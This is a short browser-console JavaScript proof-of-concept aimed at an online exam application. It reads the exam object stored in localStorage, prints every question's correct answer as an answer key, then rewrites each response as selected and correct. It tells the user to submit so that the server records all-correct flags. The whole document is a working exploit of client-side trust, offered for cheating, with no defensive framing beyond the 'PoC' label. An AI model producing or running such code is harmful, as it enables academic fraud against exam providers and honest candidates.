

(function() {
    console.log("[PoC] Accessing local exam questions object...");
    
    const rawData = localStorage.getItem("ExamQuestionsObj");
    if (!rawData) {
        console.log("[PoC] No exam data found in localStorage. Run inside an active exam session.");
        return;
    }
    
    const exam = JSON.parse(rawData);
    if (!exam || !exam.QuestionsJSON) {
        console.log("[PoC] Invalid exam structure found.");
        return;
    }
    
    console.log(`[PoC] Found ${exam.QuestionsJSON.length} questions in storage.`);
    
    console.log("=== EXAM ANSWER KEY ===");
    exam.QuestionsJSON.forEach((q, idx) => {
        console.log(`Q${idx + 1}: ${q.question} => Correct: ${q.CorrectAns}`);
    });
    
    let count = 0;
    exam.QuestionsJSON.forEach(q => {
        if (q.CorrectAns) {
            q.selectedOpt = q.CorrectAns;
            q.isAnswerCorrect = true;
            count++;
        }
    });
    
    localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));
    console.log(`[PoC] Mutated ${count} questions to correct state in localStorage.`);
    console.log("[PoC] Click submit in the exam UI to send all-correct flags to server.");
})();
